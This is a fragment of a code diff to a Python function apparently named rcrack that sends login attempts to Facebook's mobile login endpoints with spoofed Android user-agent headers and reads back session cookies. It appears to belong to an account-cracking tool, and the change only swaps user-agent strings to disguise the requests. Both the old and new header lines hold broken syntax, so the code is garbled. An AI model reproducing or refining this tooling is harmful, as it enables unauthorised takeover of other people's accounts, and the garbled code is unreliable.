@@ -326,7 +326,7 @@ def rcrack(uid,pwx,tl):
     'sec-fetch-site': 'none',
     'sec-fetch-user': '?1',
     'upgrade-insecure-requests': '1',
-    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Mobile Safari/537.36',]',}
+    'user-agent': 'Mozilla/5.0(Linux;Android 14,Infinix X671B Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome66.0.4011.172 Mobile Safari/537.36',}
 			lo = session.post('https://x.facebook.com/?stype=lo&jlou=AfeBh1P5XSlSM2wms2C4U9Hnl-2G6_2Hu6YuPY48KB5TIXB6DvoWscdFgWbOPrLKsVL0Kgk3OXFhVxwRM2moqOmStv3iCJMU3SWceuZ4YHNsxQ&smuh=1245&lh=Ac_u--FyoUL4CN2u9NE&wtsid',data=log_data,headers=header_freefb).text
 			log_cookies=session.cookies.get_dict().keys()
 
@@ -448,8 +448,7 @@ def rcrack(uid,pwx,tl):
     'sec-fetch-mode': 'navigate',
     'sec-fetch-site': 'none',
     'sec-fetch-user': '?1',
-    'upgrade-insecure-requests': '1',
-    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Mobile Safari/537.36',}
+    'upgrade-insecure-requests': '1',Mozilla/5.0(Linux;Android 14,Infinix X671B Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome66.0.4011.172 Mobile Safari/537.36',}
 			lo = session.post('https://x.facebook.com/login/?next&ref=dbl&fl&login_from_aymh=1&refid=8',data=log_data,headers=header_freefb).text
 			log_cookies=session.cookies.get_dict().keys()
 
